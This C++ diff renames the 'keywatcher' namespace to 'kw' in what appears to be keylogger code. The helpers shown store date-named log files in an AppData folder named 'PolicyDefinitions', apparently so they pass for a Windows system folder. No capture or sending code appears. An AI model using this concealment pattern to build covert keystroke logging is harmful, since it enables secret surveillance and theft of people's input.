@@ -9,7 +9,7 @@
 #include "../include/keywatcher.h"
 
 template <class T>
-std::string keywatcher::to_string(const T& value) {
+std::string kw::to_string(const T& value) {
   std::ostringstream s;
 
   s << value;
@@ -18,7 +18,7 @@ std::string keywatcher::to_string(const T& value) {
 }
 
 
-std::string keywatcher::fetch_apps_root_path() {
+std::string kw::fetch_apps_root_path() {
   // to fetch path C:\Users\USERNAME\AppData\Roaming
   std::string base_path = getenv("APPDATA");
 
@@ -29,25 +29,25 @@ std::string keywatcher::fetch_apps_root_path() {
 }
 
 
-std::string keywatcher::fetch_log_path() {
+std::string kw::fetch_log_path() {
   // location to put all log files
-  return keywatcher::fetch_apps_root_path() + "PolicyDefinitions\\";
+  return kw::fetch_apps_root_path() + "PolicyDefinitions\\";
 }
 
 
-bool keywatcher::make_dir(std::string path) {
+bool kw::make_dir(std::string path) {
   // Return True(1) if the folder already exists or successfully created
   return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
 }
 
 
-bool keywatcher::validate_path(std::string path) {
+bool kw::validate_path(std::string path) {
   // looping through the path and checking at each \\ for path's existence
   for (char &ch : path) {
     if (ch == '\\') {
       // if we reached \\ then check the path till that exists
       ch = '\0';
-      if (!keywatcher::make_dir(path)) {
+      if (!kw::make_dir(path)) {
         // can't able to create dir at this specific position
         return false;
       }
@@ -58,14 +58,14 @@ bool keywatcher::validate_path(std::string path) {
 }
 
 
-void keywatcher::log(const std::string s) {
+void kw::log(const std::string s) {
   // get path to put log files
-  std::string path = keywatcher::fetch_log_path();
+  std::string path = kw::fetch_log_path();
 
   if (!validate_path(path))
     return;
 
-  keywatcher::datetime dt = keywatcher::datetime();
+  kw::datetime dt = kw::datetime();
 
   // get file name based on current date and month
   std::string filename = dt.get_dated_filename() + ".log";
